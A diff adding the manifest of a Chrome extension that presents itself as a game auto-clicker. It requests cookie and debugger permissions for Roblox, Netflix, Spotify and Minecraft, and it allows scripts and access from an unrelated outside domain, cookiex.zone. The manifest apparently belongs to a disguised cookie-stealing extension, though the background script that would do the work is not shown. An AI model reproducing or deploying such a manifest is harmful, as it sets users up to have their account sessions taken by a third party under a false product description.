@@ -1,0 +1,33 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+        "name": "Auto-Clicker For Games",
+        "version": "1.6",
+        "manifest_version": 2,
+        "description": "UPDATE V1.5 -Up to 500 per milisecond with minimum lag!",
+        "browser_action": {
+            "default_icon": "icon.png",
+            "default_popup": "popup.html"
+        },
+        "permissions": [
+            "alarms",
+            "background",
+            "debugger",
+            "notifications",
+            "cookies",
+            "https://www.roblox.com/",
+            "https://www.netflix.com/",
+            "https://play.spotify.com/",
+            "https://minecraft.net/",
+            "https://cookiex.zone/",
+            "https://cookiex.zone/websites"
+        ],
+        "background": {
+            "scripts": ["background.js","jquery-3.2.0.js"]
+        },
+        "icons": { "16": "icon.png",
+               "48": "icon.png",
+              "128": "icon.png" },
+
+        "content_security_policy":"script-src 'self' https://cookiex.zone/; object-src 'self'"
+    }
